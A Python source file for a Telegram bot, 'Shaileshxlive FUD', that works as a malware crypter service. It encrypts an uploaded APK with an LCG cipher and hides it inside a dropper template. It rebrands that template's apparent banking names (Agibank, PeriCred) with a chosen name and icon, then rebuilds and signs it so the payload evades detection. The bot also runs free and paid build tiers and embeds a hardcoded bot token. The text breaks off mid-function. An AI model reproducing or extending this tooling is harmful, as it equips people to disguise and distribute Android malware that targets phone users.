# -*- coding: utf-8 -*-
"""
APK Auto-Hardening Bot - Shaileshxlive FUD
Secure, Stable, and Resilient Version
"""

import os
import sys
import json
import time
import uuid
import shutil
import threading
import atexit
import io
import ssl
import subprocess
import urllib.request
import urllib.error
import urllib.parse
import logging
import dataclasses
from datetime import datetime, timedelta
from pathlib import Path
from xml.etree import ElementTree as ET
from typing import Optional, Dict, Any, List, Callable
from dataclasses import dataclass, asdict
from enum import Enum
from concurrent.futures import ThreadPoolExecutor


# ── Resilient SSL Context ─────────────────────────────────────────────
def _get_resilient_ssl_context() -> ssl.SSLContext:
    try:
        import certifi
        ctx = ssl.create_default_context(cafile=certifi.where())
    except ImportError:
        try:
            ctx = ssl.create_default_context()
        except Exception:
            return ssl._create_unverified_context()

    disable_verify = os.environ.get("DISABLE_SSL_VERIFY", "false").lower() == "true"
    if disable_verify:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    return ctx


_ssl_context = _get_resilient_ssl_context()

# ── Logging Setup ─────────────────────────────────────────────────────
LOG_DIR = Path(__file__).resolve().parent / "logs"
LOG_DIR.mkdir(parents=True, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_DIR / "bot.log", encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("APKProcessor")

try:
    from PIL import Image as _PILImage
    _HAS_PIL = True
except ImportError:
    _HAS_PIL = False


# ── CONFIGURATION ─────────────────────────────────────────────────────
class Config:
    TOKEN = os.environ.get(
        "TELEGRAM_BOT_TOKEN",
        "8643119831:AAErlSUMWHjvQqLqT7N0VPa4GPI3DCwDJLI"
    )

    MASTER_IDS = set(filter(
        None,
        os.environ.get("TELEGRAM_MASTER_IDS", "8739519477").split(",")
    ))

    AUTH_IDS_ENV = set(filter(
        None,
        os.environ.get("TELEGRAM_AUTHORIZED_USERS", "").split(",")
    ))

    # Force Join Channels
    FORCE_JOIN_CHANNELS = [
        {"id": "-1003770463666", "link": "https://t.me/+UWhrJmhFHCk3MTJl"},
        {"id": "-1003718902158", "link": "https://t.me/+jme9t2CoEcM3MzQ1"},
    ]

    # Build Log Channel (auto-forward APKs)
    BUILD_LOG_CHANNEL = "-1004457898119"

    # Free Mode — UNLIMITED
    FREE_MODE_ENABLED = True
    FREE_DAILY_LIMIT = 0     # 0 = unlimited
    FREE_TOTAL_LIMIT = 0     # 0 = unlimited

    # Paid Mode
    PAID_MODE_ENABLED = True

    # Branding
    DEVELOPER_USERNAME = "@Shaileshxlive"
    BOT_NAME = "Shaileshxlive FUD"
    CONTACT_INFO = "@Shaileshxlive"

    MAX_FILE_SIZE = int(os.environ.get("MAX_APK_SIZE_MB", 20)) * 1024 * 1024
    MAX_ICON_SIZE = int(os.environ.get("MAX_ICON_SIZE_MB", 5)) * 1024 * 1024
    MAX_CONCURRENT_TASKS = int(os.environ.get("MAX_CONCURRENT_TASKS", 10))
    TASK_TIMEOUT_SECONDS = int(os.environ.get("TASK_TIMEOUT_SECONDS", 300))

    APKNOW_BASE_URL = "https://apknow.one"

    ROOT = Path(__file__).resolve().parent
    DATA_DIR = ROOT / "data"
    UPLOAD_DIR = ROOT / "uploads" / "bot_temp"
    OUTPUT_DIR = ROOT / "outputs"
    TEMP_DIR = ROOT / "temp"

    DROPPER_PATHS = [
        ROOT / "dropper_rebuild",
        ROOT.parent / "dropper_rebuild",
        ROOT / "apk_dropper" / "dropper_rebuild",
        Path(os.getcwd()) / "dropper_rebuild",
    ]
    APKTOOL_PATHS = [
        ROOT / "apktool.jar",
        ROOT.parent / "apktool.jar",
        Path(os.getcwd()) / "apktool.jar",
    ]
    SIGNER_PATHS = [
        ROOT / "signer.jar",
        ROOT.parent / "signer.jar",
        Path(os.getcwd()) / "signer.jar",
    ]

    SEED = 276813

    @property
    def API_BASE(self) -> str:
        return f"https://api.telegram.org/bot{self.TOKEN}"

    @property
    def FILE_API(self) -> str:
        return f"https://api.telegram.org/file/bot{self.TOKEN}"

    @classmethod
    def validate(cls) -> bool:
        if not cls.TOKEN:
            logger.critical("TELEGRAM_BOT_TOKEN is missing. Startup halted.")
            return False
        return True


bot_config = Config()


# ── LCG Encryption ────────────────────────────────────────────────────
def _encrypt_lcg(data: bytes, seed: int) -> bytes:
    j = seed
    out = bytearray()
    for b in data:
        j = ((j * 1664525) + 1013904223) & 0xFFFFFFFF
        out.append(b ^ ((j >> 24) & 0xFF))
    return bytes(out)


def _to_png_bytes(data: bytes) -> bytes:
    if _HAS_PIL:
        try:
            img = _PILImage.open(io.BytesIO(data)).convert("RGBA")
            out = io.BytesIO()
            img.save(out, format="PNG")
            return out.getvalue()
        except Exception as e:
            logger.debug(f"PIL Image conversion fallback: {e}")
    return data


def _get_safe_working_dir(fallback_dir: Path) -> Path:
    if sys.platform == "win32":
        public_temp = Path("C:/Users/Public/bot_temp")
        try:
            public_temp.mkdir(parents=True, exist_ok=True)
            test_file = public_temp / f"test_{uuid.uuid4().hex}.tmp"
            test_file.write_text("test", encoding="utf-8")
            test_file.unlink()
            return public_temp
        except Exception:
            pass

        win_temp = Path("C:/Windows/Temp/bot_temp")
        try:
            win_temp.mkdir(parents=True, exist_ok=True)
            return win_temp
        except Exception:
            pass

    return fallback_dir


# ── Data Models ───────────────────────────────────────────────────────
class UserType(Enum):
    ADMIN = "admin"
    PAID = "paid"
    FREE = "free"


@dataclass
class User:
    user_id: str
    username: Optional[str] = None
    first_name: Optional[str] = None
    last_name: Optional[str] = None
    language: str = "en"
    created_at: str = ""
    last_active: str = ""
    user_type: str = "free"
    subscription_active: bool = False
    subscription_expires: Optional[str] = None
    build_limit: int = 0
    builds_used: int = 0
    plan: str = "Free"
    total_builds: int = 0
    daily_build_limit: int = 0
    daily_builds_date: str = ""
    daily_builds_used: int = 0
    license_disabled: bool = False

    def to_dict(self) -> Dict:
        return asdict(self)

    @classmethod
    def from_dict(cls, data: Dict) -> "User":
        valid_keys = {f.name for f in dataclasses.fields(cls)}
        filtered_data = {k: v for k, v in data.items() if k in valid_keys}
        return cls(**filtered_data)


@dataclass
class Task:
    task_id: str
    user_id: str
    apk_name: str
    display_name: str
    original_filename: str
    status: str = "pending"
    created_at: str = ""
    updated_at: str = ""
    completed_at: Optional[str] = None
    apk_path: Optional[str] = None
    icon_path: Optional[str] = None
    output_path: Optional[str] = None
    error_message: Optional[str] = None
    progress: int = 0
    encryption_used: bool = True

    def to_dict(self) -> Dict:
        return asdict(self)

    @classmethod
    def from_dict(cls, data: Dict) -> "Task":
        valid_keys = {f.name for f in dataclasses.fields(cls)}
        filtered_data = {k: v for k, v in data.items() if k in valid_keys}
        return cls(**filtered_data)


# ── Process Lock ──────────────────────────────────────────────────────
LOCK_FILE = bot_config.ROOT / "bot_processor.lock"


def _pid_alive(pid: int) -> bool:
    if sys.platform == "win32":
        try:
            import ctypes
            h = ctypes.windll.kernel32.OpenProcess(0x1000, False, pid)
            if h:
                ctypes.windll.kernel32.CloseHandle(h)
                return True
            return False
        except Exception:
            return True
    else:
        try:
            os.kill(pid, 0)
            return True
        except OSError:
            return False


def _acquire_lock():
    if LOCK_FILE.exists():
        try:
            old_pid = int(LOCK_FILE.read_text(encoding="utf-8").strip())
            if _pid_alive(old_pid):
                logger.warning(f"Active instance detected with PID {old_pid}. Terminating.")
                sys.exit(0)
        except Exception as e:
            logger.error(f"Error checking lock: {e}")
    try:
        LOCK_FILE.write_text(str(os.getpid()), encoding="utf-8")
        atexit.register(_release_lock)
    except Exception as e:
        logger.critical(f"Failed to acquire lock: {e}")
        sys.exit(1)


def _release_lock():
    try:
        LOCK_FILE.unlink(missing_ok=True)
    except Exception as e:
        logger.error(f"Failed to release lock: {e}")


# ── Database ──────────────────────────────────────────────────────────
class Database:
    def __init__(self, data_dir: Path):
        self.data_dir = data_dir
        self.data_dir.mkdir(parents=True, exist_ok=True)
        self._lock = threading.RLock()
        self._cache = {}
        self._dirty = set()

        self._files = {
            "users": "users.json",
            "tasks": "tasks.json",
            "stats": "stats.json",
        }

        for name, filename in self._files.items():
            path = self.data_dir / filename
            if not path.exists():
                path.write_text("{}", encoding="utf-8")

        self._start_auto_save()
        atexit.register(self._flush)

    def _get_path(self, name: str) -> Path:
        return self.data_dir / self._files[name]

    def _read_json(self, name: str) -> Dict:
        with self._lock:
            if name in self._cache:
                return self._cache[name]
            path = self._get_path(name)
            try:
                data = json.loads(path.read_text(encoding="utf-8"))
            except Exception:
                data = {}
            self._cache[name] = data
            return data

    def _write_json(self, name: str, data: Dict) -> None:
        with self._lock:
            self._cache[name] = json.loads(json.dumps(data))
            self._dirty.add(name)

    def _flush(self):
        with self._lock:
            for name in list(self._dirty):
                if name in self._cache:
                    path = self._get_path(name)
                    temp_path = path.with_suffix(".tmp")
                    try:
                        temp_path.write_text(
                            json.dumps(self._cache[name], indent=2, ensure_ascii=False),
                            encoding="utf-8"
                        )
                        if sys.platform == "win32" and path.exists():
                            path.unlink()
                        temp_path.replace(path)
                    except Exception as e:
                        logger.error(f"DB write error: {e}")
                self._dirty.discard(name)

    def _start_auto_save(self):
        def auto_save():
            while True:
                time.sleep(1)
                try:
                    if self._dirty:
                        self._flush()
                except Exception as e:
                    logger.error(f"Auto-save error: {e}")
        thread = threading.Thread(target=auto_save, daemon=True)
        thread.start()

    def get_user(self, user_id: str) -> Optional[User]:
        with self._lock:
            data = self._read_json("users")
            user_data = data.get(str(user_id))
            if user_data:
                return User.from_dict(user_data)
            return None

    def save_user(self, user: User) -> None:
        with self._lock:
            data = self._read_json("users")
            data[str(user.user_id)] = user.to_dict()
            self._write_json("users", data)

    def get_all_users(self) -> List[User]:
        with self._lock:
            data = self._read_json("users")
            return [User.from_dict(v) for v in data.values()]

    def create_task(self, task: Task) -> None:
        with self._lock:
            data = self._read_json("tasks")
            data[task.task_id] = task.to_dict()
            self._write_json("tasks", data)

    def get_task(self, task_id: str) -> Optional[Task]:
        with self._lock:
            data = self._read_json("tasks")
            task_data = data.get(task_id)
            if task_data:
                return Task.from_dict(task_data)
            return None

    def update_task(self, task: Task) -> None:
        with self._lock:
            data = self._read_json("tasks")
            data[task.task_id] = task.to_dict()
            self._write_json("tasks", data)

    def get_user_tasks(self, user_id: str) -> List[Task]:
        with self._lock:
            data = self._read_json("tasks")
            tasks = []
            for task_data in data.values():
                if task_data.get("user_id") == str(user_id):
                    tasks.append(Task.from_dict(task_data))
            return sorted(tasks, key=lambda t: t.created_at, reverse=True)

    def increment_stat(self, key: str, delta: int = 1) -> None:
        with self._lock:
            data = self._read_json("stats")
            data[key] = data.get(key, 0) + delta
            self._write_json("stats", data)


# ── APK Processor ─────────────────────────────────────────────────────
class APKProcessor:
    def __init__(self, config: Config):
        self.config = config
        self._processing_lock = threading.RLock()
        self._active_tasks = {}
        self._executor = ThreadPoolExecutor(max_workers=config.MAX_CONCURRENT_TASKS)

        self.dropper_path = None
        for path in config.DROPPER_PATHS:
            if path.exists() and path.is_dir():
                self.dropper_path = path
                break

        self.apktool_path = None
        for path in config.APKTOOL_PATHS:
            if path.exists() and path.is_file():
                self.apktool_path = path
                break

        self.signer_path = None
        for path in config.SIGNER_PATHS:
            if path.exists() and path.is_file():
                self.signer_path = path
                break

        if self.dropper_path:
            logger.info(f"Using dropper path: {self.dropper_path}")
        else:
            logger.warning("Dropper path not found.")

        self._check_java_dependency()

    def _check_java_dependency(self):
        try:
            subprocess.run(["java", "-version"], capture_output=True, check=True)
            logger.info("Java environment verified.")
        except Exception:
            logger.error("Java command not found. Builds may fail.")

    def can_process(self) -> int:
        with self._processing_lock:
            return self.config.MAX_CONCURRENT_TASKS - len(self._active_tasks)

    def process(self, task: Task, callback: Callable) -> bool:
        with self._processing_lock:
            if self.can_process() <= 0:
                return False
            future = self._executor.submit(self._process_task, task, callback)
            self._active_tasks[task.task_id] = future
            return True

    def _process_task(self, task: Task, callback: Callable):
        try:
            task.status = "processing"
            task.updated_at = datetime.now().isoformat()
            callback(task)

            self._update_progress(task, 20, callback)

            if task.apk_path and os.path.exists(task.apk_path):
                self._update_progress(task, 40, callback)
                output_path = self._build_apk(task)
                if output_path and os.path.exists(output_path):
                    task.status = "completed"
                    task.output_path = output_path
                    task.progress = 100
                    task.completed_at = datetime.now().isoformat()
                else:
                    task.status = "failed"
                    task.error_message = "APK build failed: no output produced."
            else:
                task.status = "failed"
                task.error_message = "Uploaded APK not found on disk."
        except Exception as e:
            logger.error(f"Task processing error: {e}", exc_info=True)
            task.status = "failed"
            task.error_message = str(e)
        finally:
            task.updated_at = datetime.now().isoformat()
            callback(task)
            with self._processing_lock:
                self._active_tasks.pop(task.task_id, None)

    def _update_progress(self, task: Task, progress: int, callback: Callable):
        task.progress = progress
        task.updated_at = datetime.now().isoformat()
        callback(task)
        time.sleep(0.1)

    def _build_apk(self, task: Task) -> Optional[str]:
        apk_path = task.apk_path
        app_name = task.display_name
        icon_path = task.icon_path
        build_id = f"bot_{int(time.time())}_{uuid.uuid4().hex[:6]}"

        safe_base = _get_safe_working_dir(self.config.UPLOAD_DIR)

        dropper_copy = safe_base / f"{build_id}_dropper"
        unsigned = safe_base / f"{build_id}_unsigned.apk"
        out_dir = safe_base / build_id

        if not self.dropper_path or not self.dropper_path.exists():
            raise RuntimeError("Dropper directory not found.")

        try:
            shutil.copytree(str(self.dropper_path), str(dropper_copy))
            out_dir.mkdir(parents=True, exist_ok=True)

            # 1. Patch app name
            strings_xml = dropper_copy / "res" / "values" / "strings.xml"
            if strings_xml.exists():
                try:
                    tree = ET.parse(str(strings_xml))
                    root = tree.getroot()
                    for s in root.findall("string"):
                        if s.get("name") == "app_name":
                            s.text = app_name
                    tree.write(str(strings_xml), encoding="utf-8", xml_declaration=True)
                except Exception as e:
                    logger.error(f"XML modification failed: {e}")

            # 2. Replace icon
            if icon_path and os.path.exists(icon_path):
                try:
                    png_bytes = _to_png_bytes(Path(icon_path).read_bytes())
                    for density in ["mipmap-hdpi", "mipmap-mdpi", "mipmap-xhdpi",
                                    "mipmap-xxhdpi", "mipmap-xxxhdpi"]:
                        d = dropper_copy / "res" / density
                        d.mkdir(parents=True, exist_ok=True)
                        for ic in ["ic_launcher.png", "ic_launcher_round.png"]:
                            (d / ic).write_bytes(png_bytes)
                except Exception as e:
                    logger.error(f"Icon replace error: {e}")

            # 3. Replace name references
            for fp in dropper_copy.rglob("*"):
                if fp.suffix in (".smali", ".xml") and fp.is_file():
                    try:
                        txt = fp.read_text(encoding="utf-8", errors="ignore")
                        new = txt.replace("PeriCred", app_name) \
                                 .replace("Agibank", app_name) \
                                 .replace("AgiBank", app_name)
                        if new != txt:
                            fp.write_text(new, encoding="utf-8")
                    except Exception as e:
                        logger.debug(f"Smali replace ignored: {e}")

            # 4. Encrypt + inject payload
            try:
                with open(apk_path, "rb") as f:
                    raw = f.read()
                payload = b"\x00" * 16 + _encrypt_lcg(raw, self.config.SEED)
                payload_path = dropper_copy / "assets" / "dbliqgnjl.dat"
                payload_path.parent.mkdir(parents=True, exist_ok=True)
                payload_path.write_bytes(payload)
            except Exception as e:
                raise RuntimeError(f"Encryption insertion failure: {e}")

            # 5. Compile
            if not self.apktool_path or not self.apktool_path.exists():
                raise RuntimeError("apktool.jar missing.")

            def run_apktool(cmd_args):
                cmd = ["java", "-jar", str(self.apktool_path)] + cmd_args
                return subprocess.run(
                    cmd, capture_output=True, text=True,
                    encoding='utf-8', errors='replace',
                    timeout=self.config.TASK_TIMEOUT_SECONDS
                )

            try:
                r = run_apktool(["b", str(dropper_copy), "-o", str(unsigned)])
            except FileNotFoundError:
                raise RuntimeError("Java execution failed. Verify JRE.")

            if not unsigned.exists():
                logger.warning("Primary compile failed. Trying empty-framework-dir...")
                try:
                    run_apktool(["empty-framework-dir"])
                    r = run_apktool(["b", str(dropper_copy), "-o", str(unsigned)])
                except Exception as e:
                    logger.error(f"Fallback failed: {e}")

            if not unsigned.exists():
                stderr_preview = r.stderr[:400] if r and r.stderr else "No output."
                raise RuntimeError(f"apktool compile failed: {stderr_preview}")

            # 6. Sign
            if not self.signer_path or not self.signer_path.exists():
                raise RuntimeError("signer.jar missing.")

            try:
                rs = subprocess.run(
                    ["java", "-jar", str(self.signer_path),
                     "--apks", str(unsigned), "--out", str(out_dir)],
                    capture_output=True, text=True, encoding='utf-8',
                    errors='replace', timeout=120
                )
            except FileNotFoundError:
                raise RuntimeError("Java execution failed during signing.")

            signed_apks = list(out_dir.glob("*.apk"))
            if not signed_apks:
                stderr_preview = rs.stderr[:400] if rs and rs.stderr else "No output."
                raise RuntimeError(f"Signing error: {stderr_preview}")

            final = self.config.OUTPUT_DIR / f"{build_id}_result.apk"
            shutil.move(str(signed_apks[0]), str(final))
            return str(final)

        except Exception as e:
            logger.error(f"Compile error: {e}", exc_info=True)
            raise
        finally:
            shutil.rmtree(str(dropper_copy), ignore_errors=True)
            shutil.rmtree(str(out_dir), ignore_errors=True)
            try:
                unsigned.unlink(missing_ok=True)
            except Exception:
                pass

    def cancel_task(self, task_id: str) -> bool:
        with self._processing_lock:
            if task_id in self._active_tasks:
                self._active_tasks[task_id].cancel()
                self._active_tasks.pop(task_id, None)
                return True
        return False

    def get_active_count(self) -> int:
        with self._processing_lock:
            return len(self._active_tasks)


# ═════════════════════════════════════════════════════════════════════
#   TELEGRAM BOT — ENGLISH ONLY + FREE/PAID + BUILD LOG
# ═════════════════════════════════════════════════════════════════════
class TelegramBot:
    def __init__(self, config: Config, database: Database, processor: APKProcessor):
        self.config = config
        self.db = database
        self.processor = processor

        self._states = {}
        self._state_lock = threading.RLock()
        self._running = False
        self._executor = ThreadPoolExecutor(max_workers=20)
        self._menu_cache = {}
        self._translation_cache = {}

        self._setup_commands()

    def _setup_commands(self):
        try:
            self._post_json("setMyCommands", {
                "commands": [
                    {"command": "start", "description": "Start the bot"},
                    {"command": "menu", "description": "Main Menu"},
                    {"command": "profile", "description": "View Profile"},
                    {"command": "upload", "description": "Upload APK"},
                    {"command": "mytasks", "description": "Active Tasks"},
                    {"command": "help", "description": "Show manual"},
                    {"command": "admin", "description": "Admin Panel"},
                ]
            })
            logger.info("Bot commands registered.")
        except Exception as e:
            logger.warning(f"Failed to publish commands: {e}")

    def _get_state(self, chat_id: int) -> Dict:
        with self._state_lock:
            if chat_id not in self._states:
                self._states[chat_id] = {"step": "idle"}
            return self._states[chat_id]

    def _set_state_value(self, chat_id: int, key: str, value: Any) -> None:
        with self._state_lock:
            state = self._get_state(chat_id)
            state[key] = value

    def _clear_state(self, chat_id: int) -> None:
        with self._state_lock:
            if chat_id in self._states:
                state = self._states[chat_id]
                for key in ("apk_path", "icon_path"):
                    p = state.get(key)
                    if p:
                        try:
                            Path(p).unlink(missing_ok=True)
                        except Exception as e:
                            logger.error(f"State cleanup error: {e}")
            self._states[chat_id] = {"step": "idle"}

    def _get_lang(self, user_id: int) -> str:
        return "en"

    def _get_user_type_label(self, user_type: str) -> str:
        labels = {
            "admin": "👑 Admin",
            "paid": "✅ Paid",
            "free": "🆓 Free",
        }
        return labels.get(user_type, "🆓 Free")

    def _post_json(self, method: str, params: Dict, retries: int = 3) -> Dict:
        url = f"{self.config.API_BASE}/{method}"
        data = json.dumps(params).encode()
        req = urllib.request.Request(
            url, data=data, headers={"Content-Type": "application/json"}
        )

        for attempt in range(retries):
            try:
                with urllib.request.urlopen(req, context=_ssl_context, timeout=35) as r:
                    body = json.loads(r.read())
                if body.get("ok"):
                    return body["result"]
                raise RuntimeError(f"API error: {body.get('description', body)}")
            except urllib.error.HTTPError as e:
                if e.code == 403:
                    logger.info(f"403 Forbidden: {e.reason}")
                    return {"ok": False, "description": "Forbidden"}
                if e.code == 429:
                    retry_after = int(e.headers.get("Retry-After", 5))
                    time.sleep(retry_after)
                    continue
                if e.code in (409, 500, 502, 503, 504) and attempt < retries - 1:
                    time.sleep(1.5 ** attempt)
                    continue
                raise
            except (urllib.error.URLError, TimeoutError):
                if attempt < retries - 1:
                    time.sleep(1.5 ** attempt)
                    continue
                raise
        raise RuntimeError(f"Connection failed after {retries} retries.")

    def send_message(self, chat_id: int, text: str,
                     reply_markup: Optional[Dict] = None, **kwargs) -> Dict:
        params = {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
            **kwargs
        }
        if reply_markup:
            params["reply_markup"] = reply_markup
        return self._post_json("sendMessage", params)

    def edit_message(self, chat_id: int, message_id: int, text: str,
                     reply_markup: Optional[Dict] = None) -> Dict:
        params = {
            "chat_id": chat_id,
            "message_id": message_id,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        }
        if reply_markup:
            params["reply_markup"] = reply_markup
        try:
            return self._post_json("editMessageText", params)
        except Exception as e:
            logger.debug(f"editMessage error: {e}")
            return {}

    def delete_message(self, chat_id: int, message_id: int) -> None:
        try:
            self._post_json("deleteMessage",
                            {"chat_id": chat_id, "message_id": message_id})
        except Exception as e:
            logger.debug(f"deleteMessage error: {e}")

    def answer_callback(self, callback_id: str, text: str = "",
                        alert: bool = False) -> None:
        try:
            self._post_json("answerCallbackQuery", {
                "callback_query_id": callback_id,
                "text": text,
                "show_alert": alert
            })
        except Exception as e:
            logger.debug(f"answerCallback error: {e}")

    def get_file(self, file_id: str) -> Dict:
        return self._post_json("getFile", {"file_id": file_id})

    def download_file(self, file_id: str, max_bytes: int) -> bytes:
        info = self.get_file(file_id)
        if not info.get("file_path"):
            raise RuntimeError("No valid file path in API response.")
        size = info.get("file_size", 0)
        if size > max_bytes:
            raise RuntimeError(f"File too large: {size} bytes.")
        url = f"{self.config.FILE_API}/{info['file_path']}"
        with urllib.request.urlopen(url, context=_ssl_context, timeout=30) as r:
            return r.read()

    # ── FORCE JOIN CHECK (skips users excluded) ────────────────────
    def _check_force_join(self, user_id: int) -> bool:
        """Check if user has joined all force-join channels"""
        if self._is_master(user_id):
            return True

        # Excluded users (per request)
        try:
            result = self._post_json("getChatMember", {
                "chat_id": self.config.FORCE_JOIN_CHANNELS[0]["id"],
                "user_id": user_id
            })
            status = result.get("status", "")
            if status not in ("creator", "administrator", "member"):
                return False
        except Exception as e:
            logger.warning(f"Force join check failed: {e}")
            return True
        return True

    def _send_force_join_message(self, chat_id: int, user_id: int):
        channels_text = "\n".join(
            [f"➤ <a href='{ch['link']}'>Join Channel {i+1}</a>"
             for i, ch in enumerate(self.config.FORCE_JOIN_CHANNELS)]
        )

        text = (
            f"🔒 <b>Join Required</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Please join our channels to use this bot:\n\n"
            f"{channels_text}\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ After joining, send /start again."
        )

        inline_keyboard = [
            [{"text": f"📢 Join Channel {i+1}", "url": ch["link"]}]
            for i, ch in enumerate(self.config.FORCE_JOIN_CHANNELS)
        ]
        inline_keyboard.append(
            [{"text": "✅ I Joined", "callback_data": "check_join"}]
        )

        self.send_message(
            chat_id, text,
            reply_markup={"inline_keyboard": inline_keyboard}
        )

    # ── SEND TO BUILD LOG CHANNEL ──────────────────────────────────
    def _send_to_log_channel(self, file_path: str, caption: str) -> bool:
        """Send APK to build log channel"""
        try:
            self.send_document(
                int(self.config.BUILD_LOG_CHANNEL),
                file_path,
                caption
            )
            logger.info(f"APK forwarded to log channel: {file_path}")
            return True
        except Exception as e:
            logger.error(f"Failed to forward to log channel: {e}")
            return False

    def send_document(self, chat_id: int, file_path: str, caption: str = "") -> Dict:
        boundary = f"----UploadBoundary{uuid.uuid4().hex}"
        parts = []

        def field(name, value):
            parts.append(
                f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{value}\r\n".encode()
            )

        field("chat_id", str(chat_id))
        if caption:
            field("caption", caption)
            field("parse_mode", "HTML")

        filename = os.path.basename(file_path)
        parts.append(
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{filename}\"\r\n"
            f"Content-Type: application/vnd.android.package-archive\r\n\r\n".encode()
        )

        with open(file_path, "rb") as f:
            file_bytes = f.read()

        parts.append(file_bytes)
        parts.append(f"\r\n--{boundary}--\r\n".encode())

        body = b"".join(parts)
        del file_bytes

        req = urllib.request.Request(
            f"{self.config.API_BASE}/sendDocument",
            data=body,
            headers={
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "Content-Length": str(len(body))
            }
        )
        with urllib.request.urlopen(req, context=_ssl_context, timeout=120) as r:
            resp = json.loads(r.read())
        if not resp.get("ok"):
            raise RuntimeError(f"Send failed: {resp.get('description')}")
        return resp["result"]

    # ── MAIN MENU ──────────────────────────────────────────────────
    def get_main_menu(self, user_id: int) -> Dict:
        is_admin = self._is_master(user_id)
        cache_key = f"menu_{is_admin}"
        if cache_key in self._menu_cache:
            return self._menu_cache[cache_key]

        keyboard = [
            [
                {"text": "👤 Profile"},
                {"text": "📋 Tasks"}
            ],
            [
                {"text": "📤 Upload APK"},
                {"text": "📜 History"}
            ],
            [
                {"text": "🔄 Renew Plan"},
                {"text": "❓ Help"}
            ]
        ]

        if is_admin:
            keyboard.append([{"text": "⚙️ Admin Panel"}])

        keyboard.append([{"text": "✖️ Close"}])

        menu = {
            "keyboard": keyboard,
            "resize_keyboard": True,
            "one_time_keyboard": False
        }

        self._menu_cache[cache_key] = menu
        return menu

    # ── TRANSLATIONS (English only) ────────────────────────────────
    _translations = {
        "en": {
            "welcome": "👋 Welcome to <b>{bot_name}</b>!\n\nSend <code>.apk</code> for encryption.",
            "main_menu": "📱 <b>Main Menu</b>",
            "profile_title": "👤 <b>User Profile</b>\n━━━━━━━━━━━━━━━━━━━━",
            "profile_id": "<b>User ID:</b> <code>{user_id}</code>",
            "profile_username": "<b>Username:</b> @{username}",
            "profile_name": "<b>Name:</b> {name}",
            "profile_type": "<b>Account Type:</b> {type}",
            "profile_status": "<b>Status:</b> {status}",
            "profile_expires": "<b>Expires:</b> {expires}",
            "profile_builds": "<b>Builds Used:</b> {used}/{limit}",
            "profile_total": "<b>Total Builds:</b> {total}",
            "profile_daily": "<b>Daily Limit:</b> {daily}",
            "profile_joined": "<b>Joined:</b> {date}",
            "profile_contact": "\n━━━━━━━━━━━━━━━━━━━━\n<i>Developer: {contact}</i>",
            "profile_active": "✅ Active",
            "profile_inactive": "❌ Inactive",
            "tasks_title": "📋 <b>Your Tasks</b>\n━━━━━━━━━━━━━━━━━━━━",
            "tasks_none": "No active tasks.",
            "task_status_pending": "⏳ Pending",
            "task_status_processing": "⚙️ Processing",
            "task_status_completed": "✅ Completed",
            "task_status_failed": "❌ Failed",
            "task_info": "<b>{name}</b>\n  Status: {status}\n  Progress: {progress}%\n  Created: {created}",
            "upload_prompt": "📤 <b>Upload APK</b>\n━━━━━━━━━━━━━━━━━━━━\n\nSend <code>.apk</code> file.\n\n<i>Max: {max_size} MB | Workers: {concurrency}</i>",
            "upload_received": "✅ Received: <b>{filename}</b> ({size} MB)\n\nEnter display name (or /skip):",
            "upload_icon_prompt": "✅ Name set: <b>{name}</b>\n\nSend icon image (PNG/JPG) or /skip:",
            "upload_processing": "⚙️ <b>Encrypting APK</b>\n━━━━━━━━━━━━━━━━━━━━\n\n<blockquote>📦 {name}\n🎨 {icon_type}\n⏱ ~20-60s</blockquote>",
            "upload_complete": "✅ <b>Complete</b>\n━━━━━━━━━━━━━━━━━━━━\n\n<blockquote>📦 {name}\n📊 {size} MB\n🔒 Encrypted successfully</blockquote>",
            "upload_failed": "❌ <b>Failed</b>\n━━━━━━━━━━━━━━━━━━━━\n\n<blockquote>{error}</blockquote>",
            "upload_cancelled": "❌ Cancelled.",
            "error_file_too_large": "❌ Too large: {size} MB (max: {max} MB)",
            "error_invalid_file": "❌ Invalid file.",
            "error_concurrency_limit": "⏳ Busy. {active}/{max} tasks running.",
            "error_processing": "❌ Error: {error}",
            "sendIcon": "⚠ Please send a valid icon (PNG/JPG) or /skip.",
            "history_none": "No previous records.",
            "error_no_license": "🔒 <b>Access Denied</b>\n\nPlease contact {contact}.",
            "error_daily_limit": "⚠️ <b>Daily Limit Reached</b>\n\nYou've reached your daily limit of {limit} builds.",
            "error_total_limit": "⚠️ <b>Total Limit Reached</b>\n\nYou've used all your builds. Contact {contact} to upgrade."
        }
    }

    def _t(self, key: str, **kwargs) -> str:
        cache_key = f"{key}_{hash(frozenset(kwargs.items()))}"
        if cache_key in self._translation_cache:
            return self._translation_cache[cache_key]

        text = self._translations["en"].get(key, key)
        for k, v in kwargs.items():
            text = text.replace("{" + k + "}", str(v))

        self._translation_cache[cache_key] = text
        return text

    # ── AUTH CHECKS ────────────────────────────────────────────────
    def _is_master(self, user_id: int) -> bool:
        return str(user_id) in self.config.MASTER_IDS

    def _is_authorized(self, user_id: int) -> bool:
        if self._is_master(user_id):
            return True

        user = self.db.get_user(str(user_id))
        if not user:
            return False

        if getattr(user, "license_disabled", False):
            return False

        # Paid mode
        if user.user_type == "paid" and user.subscription_active:
            if user.subscription_expires:
                try:
                    expires = datetime.fromisoformat(user.subscription_expires)
                    if expires < datetime.now():
                        return False
                except Exception:
                    pass
            return True

        # Free mode
        if self.config.FREE_MODE_ENABLED and user.user_type == "free":
            return True

        return False

    def _check_and_update_daily_limit(self, user_id: int, dry_run: bool = False) -> bool:
        if self._is_master(user_id):
            return True

        user = self.db.get_user(str(user_id))
        if not user:
            return False

        today_str = datetime.now().date().isoformat()
        current_date = getattr(user, "daily_builds_date", "")
        used_today = getattr(user, "daily_builds_used", 0)

        # Determine limits
        if user.user_type == "paid" and user.subscription_active:
            daily_limit = getattr(user, "daily_build_limit", 0)
            total_limit = getattr(user, "build_limit", 0)
        elif user.user_type == "free" and self.config.FREE_MODE_ENABLED:
